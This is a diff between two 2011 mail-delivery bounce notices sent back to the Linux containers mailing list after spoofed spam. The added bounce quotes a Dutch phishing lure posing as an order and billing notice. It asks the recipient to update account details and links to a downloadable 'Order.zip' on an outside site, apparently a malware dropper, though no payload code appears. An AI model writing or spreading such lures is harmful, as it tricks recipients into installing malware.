@@ -1,9 +1,10 @@
-From: MAILER-DAEMON-AmSekf3rPqKKtDQFuppxclsi9SLTFTb5UBSOeVevoDU@public.gmane.org (Mail Delivery System)
-Subject: Undelivered Mail Returned to Sender
-Date: Fri, 25 Nov 2011 22:07:16 -0200 (BRST)
-Message-ID: <20111126000716.75D613DBB@relay02.email.alog.com.br>
+From: Mail Delivery System <Mailer-Daemon-HrzYHpwghkW2eksrSm+3yXnhMCiq3JZZ@public.gmane.org>
+Subject: Mail delivery failed: returning message to sender
+Date: Sat, 26 Nov 2011 05:16:08 +0100
+Message-ID: <E1RU9gO-0003mI-M2@one.newideaserver.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============8155663577517857066=="
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -17,125 +18,49 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-This is a MIME-encapsulated message.
+This message was created automatically by mail delivery software.
 
---===============8155663577517857066==
-Content-Type: multipart/report; report-type=delivery-status;
-	boundary="8A97744F4.1322266036/relay02.email.alog.com.br"
+A message that you sent could not be delivered to one or more of its
+recipients. This is a permanent error. The following address(es) failed:
 
-This is a MIME-encapsulated message.
+  chose-/WLB3fTvHxNmR6Xm/wNWPw@public.gmane.org
+    SMTP error from remote mail server after RCPT TO:<chose-/WLB3fTvHxNmR6Xm/wNWPw@public.gmane.org>:
+    host mfiltro01.systemec.nl [89.20.91.4]: 550 5.1.1 <chose-/WLB3fTvHxNmR6Xm/wNWPw@public.gmane.org> recipient rejected
 
---8A97744F4.1322266036/relay02.email.alog.com.br
-Content-Description: Notification
-Content-Type: text/plain; charset=us-ascii
+------ This is a copy of the message, including all the headers. ------
 
-This is the mail system at host relay02.email.alog.com.br.
-
-I'm sorry to have to inform you that your message could not
-be delivered to one or more recipients. It's attached below.
-
-For further assistance, please send mail to postmaster.
-
-If you do so, please include this problem report. You can
-delete your own text from the attached returned message.
-
-                   The mail system
-
-<tannerd.tanner-f3R3/4YnLdHBrJGnFWTVgQ@public.gmane.org>: host
-    taitdesign-co-uk.relay1a.spamh.com[75.126.136.140] said: 554 5.7.1 User
-    unknown tannerd.tanner-f3R3/4YnLdHBrJGnFWTVgQ@public.gmane.org (in reply to RCPT TO command)
-
-<catherine-A0RKSBxK/9E2epGFuHBODCp2UmYkHbXO@public.gmane.org>: host mail-in.freeserve.com[193.252.22.153]
-    said: 550 5.7.1 <catherine-A0RKSBxK/9E2epGFuHBODCp2UmYkHbXO@public.gmane.org>: Recipient address
-    rejected: User unknown (in reply to RCPT TO command)
-
-<catherinen-A0RKSBxK/9E2epGFuHBODCp2UmYkHbXO@public.gmane.org>: host mail-in.freeserve.com[193.252.22.153]
-    said: 550 5.7.1 <catherinen-A0RKSBxK/9E2epGFuHBODCp2UmYkHbXO@public.gmane.org>: Recipient address
-    rejected: User unknown (in reply to RCPT TO command)
-
-<catherinenn-A0RKSBxK/9E2epGFuHBODCp2UmYkHbXO@public.gmane.org>: host mail-in.freeserve.com[193.252.22.153]
-    said: 550 5.7.1 <catherinenn-A0RKSBxK/9E2epGFuHBODCp2UmYkHbXO@public.gmane.org>: Recipient address
-    rejected: User unknown (in reply to RCPT TO command)
-
-<sarah-3bblYfAX/V2RJKlD0jw6FVpr/1R2p/CL@public.gmane.org>: host mail-in.freeserve.com[193.252.22.142] said: 550
-    5.2.0 Mail rejete. Mail rejected. ouk_506 [506] (in reply to end of DATA
-    command)
-
---8A97744F4.1322266036/relay02.email.alog.com.br
-Content-Description: Delivery report
-Content-Type: message/delivery-status
-
-Reporting-MTA: dns; relay02.email.alog.com.br
-X-Postfix-Queue-ID: 8A97744F4
-X-Postfix-Sender: rfc822; containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-Arrival-Date: Fri, 25 Nov 2011 22:07:02 -0200 (BRST)
-
-Final-Recipient: rfc822; tannerd.tanner-f3R3/4YnLdHBrJGnFWTVgQ@public.gmane.org
-Original-Recipient: rfc822;tannerd.tanner-f3R3/4YnLdHBrJGnFWTVgQ@public.gmane.org
-Action: failed
-Status: 5.7.1
-Remote-MTA: dns; taitdesign-co-uk.relay1a.spamh.com
-Diagnostic-Code: smtp; 554 5.7.1 User unknown tannerd.tanner-f3R3/4YnLdHBrJGnFWTVgQ@public.gmane.org
-
-Final-Recipient: rfc822; catherine-A0RKSBxK/9E2epGFuHBODCp2UmYkHbXO@public.gmane.org
-Original-Recipient: rfc822;catherine-A0RKSBxK/9E2epGFuHBODCp2UmYkHbXO@public.gmane.org
-Action: failed
-Status: 5.7.1
-Remote-MTA: dns; mail-in.freeserve.com
-Diagnostic-Code: smtp; 550 5.7.1 <catherine-A0RKSBxK/9E2epGFuHBODCp2UmYkHbXO@public.gmane.org>: Recipient
-    address rejected: User unknown
-
-Final-Recipient: rfc822; catherinen-A0RKSBxK/9E2epGFuHBODCp2UmYkHbXO@public.gmane.org
-Original-Recipient: rfc822;catherinen-A0RKSBxK/9E2epGFuHBODCp2UmYkHbXO@public.gmane.org
-Action: failed
-Status: 5.7.1
-Remote-MTA: dns; mail-in.freeserve.com
-Diagnostic-Code: smtp; 550 5.7.1 <catherinen-A0RKSBxK/9E2epGFuHBODCp2UmYkHbXO@public.gmane.org>: Recipient
-    address rejected: User unknown
-
-Final-Recipient: rfc822; catherinenn-A0RKSBxK/9E2epGFuHBODCp2UmYkHbXO@public.gmane.org
-Original-Recipient: rfc822;catherinenn-A0RKSBxK/9E2epGFuHBODCp2UmYkHbXO@public.gmane.org
-Action: failed
-Status: 5.7.1
-Remote-MTA: dns; mail-in.freeserve.com
-Diagnostic-Code: smtp; 550 5.7.1 <catherinenn-A0RKSBxK/9E2epGFuHBODCp2UmYkHbXO@public.gmane.org>: Recipient
-    address rejected: User unknown
-
-Final-Recipient: rfc822; sarah-3bblYfAX/V2RJKlD0jw6FVpr/1R2p/CL@public.gmane.org
-Original-Recipient: rfc822;sarah-3bblYfAX/V2RJKlD0jw6FVpr/1R2p/CL@public.gmane.org
-Action: failed
-Status: 5.2.0
-Remote-MTA: dns; mail-in.freeserve.com
-Diagnostic-Code: smtp; 550 5.2.0 Mail rejete. Mail rejected. ouk_506 [506]
-
---8A97744F4.1322266036/relay02.email.alog.com.br
-Content-Description: Undelivered Message Headers
-Content-Type: text/rfc822-headers
-
-Received: from ks212792.kimsufi.com (ks212792.kimsufi.com [188.165.222.148])
-	(Authenticated sender: r1sports-jrOIYVmj8m039yzSjRtAkw@public.gmane.org)
-	by relay02.email.alog.com.br (Postfix) with ESMTP id 8A97744F4;
-	Fri, 25 Nov 2011 22:07:02 -0200 (BRST)
-Received: from [188.165.222.148] by ks212792.kimsufi.com id X0z7CR1hwNBgdU; Sat, 26 Nov 2011 01:09:02 +0100
-Message-ID: <004d01ccabcf$98f9f600$14000a0a-0FG0TbAVflkGE7VKLSIi9laTQe2KTcn/@public.gmane.org>
-From: "Nata" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-To: <tannerd.tanner-f3R3/4YnLdHBrJGnFWTVgQ@public.gmane.org>
-Subject: Hi my new friend.
-Date: Sat, 26 Nov 2011 01:09:02 +0100
+Return-path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: from ks212792.kimsufi.com ([188.165.222.148])
+	by one.newideaserver.com with esmtpa (Exim 4.69)
+	(envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)
+	id 1RTJnG-00039U-5c; Wed, 23 Nov 2011 21:51:46 +0100
+Received: from [188.165.222.148] by ks212792.kimsufi.com id sG6IWu0oJweA with SMTP; Wed, 23 Nov 2011 21:53:30 +0100
+Date: Wed, 23 Nov 2011 21:53:30 +0100
+From: "billing" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+X-Mailer: The Bat! (v3.2.44.2) Home
+X-Priority: 3 (Normal)
+Message-ID: <88134776.82375500408705-0FG0TbAVflkGE7VKLSIi9laTQe2KTcn/@public.gmane.org>
+To: <choric-/WLB3fTvHxNmR6Xm/wNWPw@public.gmane.org>
+Subject: Your order reference is 798118090.
 MIME-Version: 1.0
-Content-Type: multipart/mixed;
- boundary="----------6182C91B58A955"
+Content-Type: text/plain;
+	charset="windows-1252"
+Content-Transfer-Encoding: 8bit
+X-NewIdeaServer-MailScanner-Information: Please contact the ISP for more information
+X-NewIdeaServer-MailScanner-ID: 1RTJnG-00039U-5c
+X-NewIdeaServer-MailScanner: Not scanned: please contact your Internet E-Mail Service Provider for details
+X-NewIdeaServer-MailScanner-SpamCheck: 
+X-NewIdeaServer-MailScanner-From: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+X-Spam-Status: No
 
---8A97744F4.1322266036/relay02.email.alog.com.br--
 
---===============8155663577517857066==
-Content-Type: text/plain; charset="us-ascii"
-MIME-Version: 1.0
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline
 
-_______________________________________________
-Containers mailing list
-Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============8155663577517857066==--
+
+Hallo, choric.
+
+Werk uw accountgegevens.
+http://www.efpa-italia.it/clientedown/Order.zip?choric-/WLB3fTvHxNmR6Xm/wNWPw@public.gmane.org
+
+
+==
+Tel./Fax.: +31 (40) 039-77-28
